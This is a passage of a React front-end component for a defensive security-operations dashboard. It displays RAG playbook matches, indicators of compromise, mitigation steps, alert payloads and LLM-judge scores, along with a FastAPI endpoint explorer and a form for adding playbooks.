                        {selectedThreat.analysis?.severity || 'OFFLINE EVALUATION'}
                      </span>
                    </div>

                    <div className="space-y-4">
                      {/* RAG Context Matched */}
                      <div className="p-3 bg-slate-900/60 rounded-lg border border-slate-850">
                        <h4 className="text-[11px] font-bold text-emerald-400 font-mono mb-2 flex items-center gap-1.5">
                          <Database className="h-3 w-3" /> RETRIEVED RAG SECURITY PLAYBOOK CONTEXT:
                        </h4>
                        {selectedThreat.matchedDocs && selectedThreat.matchedDocs.length > 0 ? (
                          selectedThreat.matchedDocs.map((m, idx) => (
                            <div key={idx} className="text-xs mb-2 last:mb-0">
                              <div className="flex justify-between font-semibold text-slate-300 font-mono text-[10px] mb-0.5">
                                <span>📄 {m.doc.title}</span>
                                <span className="text-emerald-400 font-normal">Score: {m.score}</span>
                              </div>
                              <p className="text-[10px] leading-relaxed text-slate-400 font-mono">
                                {m.doc.content}
                              </p>
                            </div>
                          ))
                        ) : (
                          <div className="text-[10px] font-mono text-slate-500">
                            No precise security playbooks matched this hazard indicator. Standard offline mitigations active.
                          </div>
                        )}
                      </div>

                      {/* IOCs / Matched Vulnerabilities */}
                      <div className="grid grid-cols-2 gap-4">
                        <div className="p-3 bg-slate-900/40 rounded-lg border border-slate-800">
                          <span className="text-[10px] font-mono text-slate-500 block mb-1">Indicators of Compromise (IOCs)</span>
                          <div className="flex flex-wrap gap-1">
                            {selectedThreat.analysis?.indicatorsOfCompromise.map((ioc, i) => (
                              <span key={i} className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-cyan-300 border border-slate-700 font-mono">
                                {ioc}
                              </span>
                            )) || <span className="text-xs text-slate-500">None extracted</span>}
                          </div>
                        </div>

                        <div className="p-3 bg-slate-900/40 rounded-lg border border-slate-800">
                          <span className="text-[10px] font-mono text-slate-500 block mb-1 font-sans">Matching Vulnerabilities</span>
                          <div className="flex flex-wrap gap-1">
                            {selectedThreat.analysis?.vulnerabilitiesMatched.map((vuln, i) => (
                              <span key={i} className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-amber-300 border border-slate-705 font-mono">
                                {vuln}
                              </span>
                            )) || <span className="text-xs text-slate-500">None mapped</span>}
                          </div>
                        </div>
                      </div>

                      {/* Technical mitigation procedures */}
                      <div className="p-3 bg-slate-900/40 rounded-lg border border-slate-850">
                        <span className="text-[10px] font-mono text-amber-500 block mb-1 font-semibold uppercase tracking-wide">Orchestrated Playbook Action steps:</span>
                        <p className="text-xs text-slate-350 leading-relaxed font-mono font-medium mb-3">
                          {selectedThreat.analysis?.recommendedMitigation}
                        </p>
                        
                        <div className="space-y-1.5 font-mono text-[10px]">
                          {selectedThreat.analysis?.mitigationSteps.map((step, i) => (
                            <div key={i} className="flex gap-2 text-slate-400 leading-normal">
                              <span className="text-cyan-400 font-bold">[{i+1}]</span>
                              <span>{step}</span>
                            </div>
                          )) || <span className="text-xs text-slate-500">None specified</span>}
                        </div>
                      </div>

                    </div>
                  </div>

                  {/* Summary & Executive Brief Card */}
                  <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl">
                    <span className="text-[9px] font-mono text-slate-400">Node Output: [agent_summarizer_brief]</span>
                    <h3 className="font-semibold text-slate-100 text-sm mt-0.5 mb-3 flex items-center gap-1.5">
                      <FileText className="h-4 w-4 text-cyan-400" /> Executive & Technical Summaries
                    </h3>

                    <div className="space-y-3.5">
                      <div>
                        <span className="text-[9px] font-mono text-slate-400 uppercase tracking-widest block mb-0.5">Executive Digest:</span>
                        <p className="text-xs text-slate-300 leading-relaxed">
                          {selectedThreat.summary?.executiveSummary || "Evaluation summary processing aborted or unavailable offline."}
                        </p>
                      </div>

                      <div>
                        <span className="text-[9px] font-mono text-slate-400 uppercase tracking-widest block mb-0.5">Incident Technical Mechanics:</span>
                        <p className="text-xs text-slate-400 leading-relaxed font-mono">
                          {selectedThreat.summary?.technicalDetails || "Technical assessments can only be retrieved securely through Gemini connections."}
                        </p>
                      </div>

                      <div>
                        <span className="text-[9px] font-mono text-slate-400 uppercase tracking-widest block mb-1.5 font-semibold">Strategic Business & Operational Risks:</span>
                        <div className="space-y-1 text-xs">
                          {selectedThreat.summary?.keyRisks.map((risk, idx) => (
                            <div key={idx} className="flex items-start gap-2 text-slate-300 leading-relaxed">
                              <span className="text-amber-500 text-[10px] mt-0.5">⚠️</span>
                              <span>{risk}</span>
                            </div>
                          )) || <span className="text-xs text-slate-500">No organizational risks extracted</span>}
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Alert Payload Card */}
                  <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl">
                    <span className="text-[9px] font-mono text-slate-400">Node Output: [agent_alerting_formatter]</span>
                    <h3 className="font-semibold text-slate-100 text-sm mt-0.5 mb-3 flex items-center gap-1.5">
                      <Activity className="h-4 w-4 text-indigo-400" /> SIEM & Monitoring Notifications Payload
                    </h3>

                    <div className="space-y-3 font-mono">
                      <div className="flex flex-col sm:flex-row justify-between gap-3 text-xs p-2.5 bg-slate-900 rounded-lg border border-slate-850">
                        <div className="flex gap-4">
                          <div>
                            <span className="text-[9px] text-slate-500 block">DESTINATION CHANNEL:</span>
                            <span className="font-bold text-white uppercase">{selectedThreat.alert?.channel || 'Security Hub'}</span>
                          </div>
                          <div>
                            <span className="text-[9px] text-slate-500 block">PRIORITY ACTION:</span>
                            <span className={`text-[10px] px-1.5 py-0.2 rounded font-bold font-mono ${getPriorityBadgeColor(selectedThreat.alert?.priority)}`}>
                              {selectedThreat.alert?.priority || 'P2'}
                            </span>
                          </div>
                        </div>
                        <div className="text-slate-400 text-[10px] flex items-center gap-1">
                          <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
                          <span>Status: Payload Ready</span>
                        </div>
                      </div>

                      <div>
                        <span className="text-[9px] text-slate-400 block mb-1 font-semibold">SLACK CHANNEL INSTANT MESSAGE:</span>
                        <div className="bg-slate-900 p-3 rounded-lg border border-slate-850 text-xs text-slate-300 leading-relaxed">
                          {selectedThreat.alert?.messageText || 'Initializing target Slack API hooks...'}
                        </div>
                      </div>

                      <div>
                        <span className="text-[9px] text-slate-400 block mb-1 font-semibold">W3C WEBHOOK POST SCHEMATIC (JSON PAYLOAD):</span>
                        <pre className="p-3 bg-slate-900 rounded-lg border border-slate-850 font-mono text-[10px] text-cyan-300 overflow-x-auto leading-relaxed">
                          {selectedThreat.alert?.payload 
                            ? JSON.stringify(selectedThreat.alert.payload, null, 2)
                            : '// Webhook JSON configuration stream unformatted.'}
                        </pre>
                      </div>
                    </div>
                  </div>

                  {/* Evaluation Pipelines metrics */}
                  <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl relative overflow-hidden" id="evaluation-card">
                    <div className="flex justify-between items-start mb-3.5 pb-2.5 border-b border-slate-800/60">
                      <div>
                        <span className="text-[9px] font-mono text-slate-400">Node Output: [agent_eval_independent_validator]</span>
                        <h3 className="font-semibold text-slate-100 text-sm mt-0.5 flex items-center gap-1.5">
                          <Sliders className="h-4 w-4 text-cyan-400" /> LLM-as-a-Judge Evaluation Pipeline
                        </h3>
                      </div>
                      <span className="text-[10px] font-mono px-2 py-0.5 bg-emerald-500/10 text-emerald-400 rounded-full border border-emerald-500/15">
                        Verified Valid
                      </span>
                    </div>

                    {selectedThreat.evaluation ? (
                      <div className="flex flex-col lg:flex-row gap-5">
                        {/* Evaluation Metrics left side */}
                        <div className="flex-1">
                          <h3 className="text-[10px] font-bold uppercase tracking-widest text-slate-500 mb-3 font-sans">Evaluation Scores</h3>
                          <div className="grid grid-cols-3 gap-3">
                            {/* Metric 1 */}
                            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-center">
                              <span className="text-[9px] font-mono text-slate-400 uppercase tracking-widest block mb-1">Technical Accuracy</span>
                              <div className="text-xl font-bold font-mono text-white mb-1">
                                {selectedThreat.evaluation.accuracyScore}/10
                              </div>
                              <div className="w-full bg-slate-800 rounded-full h-1 max-w-[80px] mx-auto overflow-hidden">
                                <div className="bg-cyan-500 h-1 rounded-full" style={{ width: `${selectedThreat.evaluation.accuracyScore * 10}%` }} />
                              </div>
                            </div>

                            {/* Metric 2 */}
                            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-center">
                              <span className="text-[9px] font-mono text-slate-400 uppercase tracking-widest block mb-1">Log Relevance</span>
                              <div className="text-xl font-bold font-mono text-white mb-1">
                                {selectedThreat.evaluation.relevanceScore}/10
                              </div>
                              <div className="w-full bg-slate-800 rounded-full h-1 max-w-[80px] mx-auto overflow-hidden">
                                <div className="bg-indigo-500 h-1 rounded-full" style={{ width: `${selectedThreat.evaluation.relevanceScore * 10}%` }} />
                              </div>
                            </div>

                            {/* Metric 3 */}
                            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-center">
                              <span className="text-[9px] font-mono text-slate-400 uppercase tracking-widest block mb-1">RAG Faithfulness</span>
                              <div className="text-xl font-bold font-mono text-white mb-1">
                                {selectedThreat.evaluation.faithfulnessScore}/10
                              </div>
                              <div className="w-full bg-slate-800 rounded-full h-1 max-w-[80px] mx-auto overflow-hidden">
                                <div className="bg-emerald-500 h-1 rounded-full" style={{ width: `${selectedThreat.evaluation.faithfulnessScore * 10}%` }} />
                              </div>
                            </div>
                          </div>

                          {/* Critic Criticism Text */}
                          <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-xs font-mono mt-3">
                            <span className="text-[9px] text-amber-500 font-bold block mb-1 font-sans">EVALUATOR CRITICISM & REAL-TIME REASONING:</span>
                            <p className="text-slate-300 leading-relaxed mb-2 italic">
                              "{selectedThreat.evaluation.criticism}"
                            </p>
                            <p className="text-slate-400 leading-normal text-[10px] pt-1.5 border-t border-slate-800/60">
                              {selectedThreat.evaluation.details}
                            </p>
                          </div>
                        </div>

                        {/* Data Lineage right side */}
                        <div className="w-full lg:w-64 p-4 bg-slate-950 rounded-xl border border-slate-800 flex flex-col justify-between">
                          <div>
                            <h3 className="text-[10px] font-bold uppercase tracking-widest text-slate-500 mb-3 font-sans">Data Lineage</h3>
                            <div className="space-y-2 font-mono text-[10px]">
                              <div className="flex justify-between items-center pb-1.5 border-b border-slate-800/55">
                                <span className="text-slate-400">Log Stream:</span>
                                <span className="font-semibold text-slate-300 truncate max-w-[124px]">{selectedThreat.source || 'Manual_Terminal'}</span>
                              </div>
                              <div className="flex justify-between items-center pb-1.5 border-b border-slate-800/55">
                                <span className="text-slate-400">Knowledge Base:</span>
                                <span className="font-semibold text-slate-300">CVE_Master_DB_2026</span>
                              </div>
                              <div className="flex justify-between items-center pb-1.5 border-b border-slate-800/55">
                                <span className="text-slate-400">Vector Store:</span>
                                <span className="font-semibold text-slate-300">FAISS_Index_A92</span>
                              </div>
                              <div className="flex justify-between items-center">
                                <span className="text-slate-400">Verified By:</span>
                                <span className="font-semibold text-emerald-400 font-sans">LLM-as-a-Judge</span>
                              </div>
                            </div>
                          </div>
                          <div className="mt-4 pt-3.5 border-t border-slate-800/50 flex justify-between items-center text-[9px] font-mono text-slate-500">
                            <span>Hash: 882-AFK-092</span>
                            <span className="text-indigo-400 font-semibold">[Verified (0.003% Hallucination)]</span>
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div className="text-xs font-mono text-slate-400 py-3">
                        Analyzing system accuracy metrics online... Requires active validator routing telemetry.
                      </div>
                    )}
                  </div>
                </>
              ) : (
                <div className="text-center py-20 text-slate-500 font-mono">
                  Loading incident registry records...
                </div>
              )}
            </div>

          </div>

        </section>

      </main>

      {/* ================= SECTION 3: FASTAPI INTERACTIVE INTEGRATIONS CONSOLE ================= */}
      <section className="max-w-7xl mx-auto px-6 pb-20" id="fastapi-integrations-console">
        <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-6 shadow-xl relative overflow-hidden">
          <div className="absolute top-0 left-0 w-32 h-32 bg-cyan-600/5 rounded-full blur-3xl pointer-events-none" />
          
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-slate-800 pb-4 mb-6">
            <div className="flex items-center gap-2">
              <Code className="h-5 w-5 text-indigo-400" />
              <div>
                <h3 className="text-base font-semibold text-white">FastAPI Interactive Integrations Documentation</h3>
                <p className="text-xs text-slate-400">Live JSON playground exposing automated endpoints to monitoring scripts</p>
              </div>
            </div>
            <a 
              href="/api/openapi.json" 
              target="_blank" 
              className="px-3 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs font-mono text-slate-300 hover:bg-slate-800 duration-150 flex items-center gap-1"
            >
              <ExternalLink className="h-3 w-3" />
              <span>openapi.json</span>
            </a>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            
            {/* API Endpoints Explorer list and configurations */}
            <div className="lg:col-span-5 flex flex-col gap-4">
              <span className="text-[10px] font-mono text-slate-500 block">CHOOSE TELEMETRY ENDPOINT METHOD:</span>

              <div className="space-y-3 font-mono text-xs">
                
                {/* Route 1 */}
                <div 
                  onClick={() => {
                    setSwaggerSelectedMethod('GET');
                    setSwaggerSelectedUrl('/api/health');
                  }}
                  className={`p-3 rounded-lg border cursor-pointer transition-all flex items-center justify-between ${
                    swaggerSelectedUrl === '/api/health' ? 'bg-slate-900 border-cyan-500' : 'bg-slate-900/40 border-slate-850 hover:bg-slate-900'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 bg-green-500/10 text-green-400 font-bold font-mono rounded text-[9px]">GET</span>
                    <span className="text-slate-350 font-semibold font-mono">/api/health</span>
                  </div>
                  <span className="text-[9px] text-slate-500">Service Status</span>
                </div>

                {/* Route 2 */}
                <div 
                  onClick={() => {
                    setSwaggerSelectedMethod('GET');
                    setSwaggerSelectedUrl('/api/threats');
                  }}
                  className={`p-3 rounded-lg border cursor-pointer transition-all flex items-center justify-between ${
                    swaggerSelectedUrl === '/api/threats' && swaggerSelectedMethod === 'GET' ? 'bg-slate-900 border-cyan-500' : 'bg-slate-900/40 border-slate-850 hover:bg-slate-900'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 bg-green-500/10 text-green-400 font-bold font-mono rounded text-[9px]">GET</span>
                    <span className="text-slate-350 font-semibold font-mono">/api/threats</span>
                  </div>
                  <span className="text-[9px] text-slate-500">Fetch History</span>
                </div>

                {/* Route 3 */}
                <div 
                  onClick={() => {
                    setSwaggerSelectedMethod('POST');
                    setSwaggerSelectedUrl('/api/threats/analyze');
                    setSwaggerRequestPayload(JSON.stringify({
                      rawText: "Intrusion match on production network sector 7: suspicious packet sizes targeting secure SSH nodes from host IP 185.220.101.55.",
                      source: "WAF Core Gate"
                    }, null, 2));
                  }}
                  className={`p-3 rounded-lg border cursor-pointer transition-all flex items-center justify-between ${
                    swaggerSelectedUrl === '/api/threats/analyze' ? 'bg-slate-900 border-cyan-500' : 'bg-slate-900/40 border-slate-850 hover:bg-slate-900'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 bg-cyan-500/10 text-cyan-400 font-bold font-mono rounded text-[9px]">POST</span>
                    <span className="text-slate-355 font-semibold font-mono">/api/threats/analyze</span>
                  </div>
                  <span className="text-[9px] text-slate-500 font-mono">Ingest & Run Pipeline</span>
                </div>

                {/* Route 4 */}
                <div 
                  onClick={() => {
                    setSwaggerSelectedMethod('GET');
                    setSwaggerSelectedUrl('/api/rag/documents');
                  }}
                  className={`p-3 rounded-lg border cursor-pointer transition-all flex items-center justify-between ${
                    swaggerSelectedUrl === '/api/rag/documents' && swaggerSelectedMethod === 'GET' ? 'bg-slate-900 border-cyan-500' : 'bg-slate-900/40 border-slate-850 hover:bg-slate-900'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 bg-green-500/10 text-green-400 font-bold font-mono rounded text-[9px]">GET</span>
                    <span className="text-slate-350 font-semibold font-mono">/api/rag/documents</span>
                  </div>
                  <span className="text-[9px] text-slate-500">List RAG Playbooks</span>
                </div>

              </div>

              {swaggerSelectedMethod === 'POST' && (
                <div className="space-y-1.5 mt-2">
                  <label className="text-[10px] font-mono text-slate-400 block font-semibold">CUSTOM POST PAYLOAD BODY:</label>
                  <textarea
                    value={swaggerRequestPayload}
                    onChange={(e) => setSwaggerRequestPayload(e.target.value)}
                    className="w-full h-24 p-2 bg-slate-900 border border-slate-850 text-[11px] font-mono rounded-lg focus:outline-none focus:border-cyan-500 text-slate-200"
                  />
                </div>
              )}

              <button
                onClick={executeSwaggerSim}
                className="w-full py-2 bg-indigo-600 rounded-lg text-xs font-semibold hover:bg-indigo-700 transition-all text-white mt-1.5 shadow-md shadow-indigo-500/10"
              >
                Execute Endpoint Query
              </button>

            </div>

            {/* Response Code Terminal Viewer (LG: 7 spans) */}
            <div className="lg:col-span-7 flex flex-col">
              <div className="flex items-center justify-between bg-slate-900 px-4 py-2.5 rounded-t-lg border-t border-x border-slate-850">
                <div className="flex items-center gap-2">
                  <span className="h-2.5 w-2.5 rounded-full bg-red-500" />
                  <span className="h-2.5 w-2.5 rounded-full bg-yellow-500" />
                  <span className="h-2.5 w-2.5 rounded-full bg-green-500" />
                  <span className="text-[10px] font-mono text-slate-400 ml-1.5">RESPONSE LOGGER TERMINAL</span>
                </div>
                <span className="text-[9px] font-mono text-slate-500">api_gateway_monitor.sh</span>
              </div>
              <pre className="flex-1 bg-slate-950 p-4 border border-slate-850 rounded-b-lg font-mono text-[11px] text-slate-300 overflow-x-auto min-h-[220px] max-h-[300px] leading-relaxed whitespace-pre-wrap select-text">
                {swaggerResponseJson}
              </pre>
            </div>

          </div>
        </div>
      </section>

      {/* RAG Context Custom Doc Creator Modal Popup */}
      <AnimatePresence>
        {showAddDocModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="creator-modal">
            <motion.div 
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="w-full max-w-md bg-slate-900 border border-slate-800 p-6 rounded-xl shadow-2xl relative"
            >
              <h3 className="font-semibold text-slate-100 text-base mb-4 flex items-center gap-1.5">
                <Database className="h-5 w-5 text-emerald-400" /> Add Custom Security Playbook
              </h3>

              <form onSubmit={handleAddCustomPlaybook} className="space-y-4 text-xs font-mono">
                <div>
                  <label className="text-slate-400 block mb-1">PLaybook title:</label>
                  <input
                    type="text"
                    required
                    value={newDocTitle}
                    onChange={(e) => setNewDocTitle(e.target.value)}
                    placeholder="e.g. AWS S3 Buckets Leak Protection Guidelines"
                    className="w-full bg-slate-950 p-2 border border-slate-800 rounded focus:border-emerald-500 text-slate-200 focus:outline-none"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-slate-400 block mb-1">Category:</label>
                    <select
                      value={newDocCategory}
                      onChange={(e) => setNewDocCategory(e.target.value as any)}
                      className="w-full bg-slate-950 p-2 border border-slate-800 rounded focus:border-emerald-500 text-slate-200 focus:outline-none"
                    >
                      <option value="policy">Policy Standard</option>
                      <option value="network">Network / Port</option>
                      <option value="iam">Access Security</option>
                      <option value="exploit">Vulnerability exploit</option>
                      <option value="malware">Malware patterns</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-slate-400 block mb-1">Tags (comma split):</label>
                    <input
                      type="text"
                      value={newDocTags}
                      onChange={(e) => setNewDocTags(e.target.value)}
                      placeholder="s3, leakage, isolation"
                      className="w-full bg-slate-950 p-2 border border-slate-800 rounded focus:border-emerald-500 text-slate-200 focus:outline-none"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-slate-400 block mb-1">Playbook details / policy content:</label>
                  <textarea
                    required
                    rows={4}
                    value={newDocContent}
                    onChange={(e) => setNewDocContent(e.target.value)}
                    placeholder="Enter security guidelines, technical command line steps, or vulnerability descriptions in markdown or clear text..."
                    className="w-full bg-slate-950 p-2 border border-slate-800 rounded focus:border-emerald-500 text-slate-200 focus:outline-none font-sans font-normal resize-none"
                  />
                </div>

                <div className="flex justify-end gap-3 pt-2">
                  <button
                    type="button"
                    onClick={() => setShowAddDocModal(false)}
                    className="px-4 py-2 border border-slate-800 hover:bg-slate-850 rounded text-slate-400 max-h-[36px]"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 rounded text-white flex items-center gap-1 max-h-[36px]"
                  >
                    <Send className="h-3 w-3" /> Insert Record
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Footer Status Bar from Sleek Interface Theme */}
      <footer className="h-10 bg-slate-950 border-t border-slate-800 flex items-center justify-between px-6 shrink-0 text-[10px] text-slate-550 font-mono mt-auto bg-slate-900/10">
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-1.5">
            <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
            <span>CPU LOAD: 12%</span>
          </div>
          <div className="flex items-center gap-1.5">
            <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
            <span>MEMORY ALLOC: 4.2GB / 16GB</span>
          </div>
        </div>
        <div className="flex gap-4 text-slate-500">
          <span>CONTAINER_ID: 2A63-SA92</span>
          <span>CLUSTER_REGION: sandbox-us-east1</span>
          <span>SYSTEM_UPTIME: 142h 12m</span>
        </div>
      </footer>

    </div>
  );
}
